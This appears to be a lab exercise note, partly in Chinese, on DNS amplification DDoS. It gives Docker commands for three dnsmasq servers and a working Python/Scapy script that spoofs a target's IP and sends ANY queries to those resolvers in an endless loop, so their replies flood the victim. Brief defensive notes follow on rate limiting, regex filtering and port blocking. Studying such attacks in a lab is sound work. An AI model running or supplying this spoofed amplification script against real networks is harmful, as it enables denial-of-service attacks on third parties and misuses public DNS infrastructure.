Reference: 

DNS1
```
docker run --rm -d --net myLab --name DNS1 --domainname DNS1.com --cap-add=NET_ADMIN andyshinn/dnsmasq
```

DNS2
```
docker run --rm -d --net myLab --name DNS2 --domainname DNS2.com --cap-add=NET_ADMIN andyshinn/dnsmasq
```

DNS3
```
docker run --rm -d --net myLab --name DNS3 --domainname DNS3.com --cap-add=NET_ADMIN andyshinn/dnsmasq
```


```
#!/usr/bin/env python
  
from scapy.all import *
# Let ip and domainname to pairs
with open("SERVERS.txt", "r") as servers_file, open("DOMAINS.txt", "r") as domains_file:
        servers = servers_file.readlines()
        domains = domains_file.readlines()
        dnsServer = list(zip(servers, domains))

while(1):
        for dns_num in range(len(dnsServer)):

                target     = "172.18.0.2" # Target host
                nameserver = str(dnsServer[dns_num][0]).strip() # DNS server
                domain     = str(dnsServer[dns_num][1]).strip() # Some domain name like "google.com" etc. 

                ip  = IP(src=target, dst=nameserver)
                udp = UDP(dport=53)
                dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

                request = (ip/udp/dns)
    
                send(request)
```


## Prevent the DDOS Attack

### Rate limiting
這是一個常用的方法，此方法簡單來說就是限制一個DNS的最大傳送流量，當傳輸的流量超過這個域值，之後它傳輸的封包我們都會把它丟棄。

### Regular express filters 
Regular express filter 可用於抵擋一部份DDOS 攻擊，其原理為DDOS attackers 使用的Http header或payload有相似之處，此時就可以用正則表達過濾來將相關的request過濾掉。(可以使用web server 或firewall來屏蔽掉http請求)

### Port Blocking

將沒有使用到的Port關閉，防止非法人士掃描伺服器開放的port運用漏洞來攻擊。



